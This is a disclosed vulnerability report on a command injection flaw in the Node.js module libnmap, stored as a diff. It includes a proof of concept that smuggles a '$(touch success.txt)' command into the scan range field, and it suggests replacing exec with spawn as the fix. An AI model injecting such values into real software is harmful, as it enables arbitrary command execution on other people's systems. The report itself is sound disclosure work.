@@ -1,0 +1,66 @@
+ReportLink:https://hackerone.com/reports/390865
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/cris_semmle
+ReportedTo:Node.js third-party modules(nodejs-ecosystem)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:14.10.2018 9:32:09
+
+Summary:
+vulnerable_versions: <0.4.16
+patched_versions: >=0.4.16
+I would like to report a command injection vulnerability in libnmap.
+It allows an attacker to inject arbitrary OS commands instead of a valid network range to be scanned.
+
+# Module
+
+**module name:** libnmap
+**version:** 0.4.11
+**npm page:** `https://www.npmjs.com/package/libnmap`
+
+## Module Description
+
+API to access nmap from node.js
+
+## Module Stats
+
+101 downloads in the last week
+
+# Vulnerability
+
+## Vulnerability Description
+
+If the attacker is allowed to provide the "range" field for the network scan, she can inject arbitrary OS commands instead of a valid IP range.
+
+## Steps To Reproduce:
+
+```js
+const nmap = require('libnmap');
+const opts = {
+    range: [
+        'scanme.nmap.org',
+        "x.x.$(touch success.txt)"
+    ]
+};
+nmap.scan(opts, function(err, report) {
+    if (err) throw new Error(err);
+
+    for (let item in report) {
+        console.log(JSON.stringify(report[item]));
+    }
+});
+```
+
+## Patch
+
+N/A use spawn instead of exec
+
+# Wrap up
+
+- I contacted the maintainer to let them know: N
+- I opened an issue in the related repository: N
+
+## Impact
+
+The attacker can run arbitrary OS commands using this module.
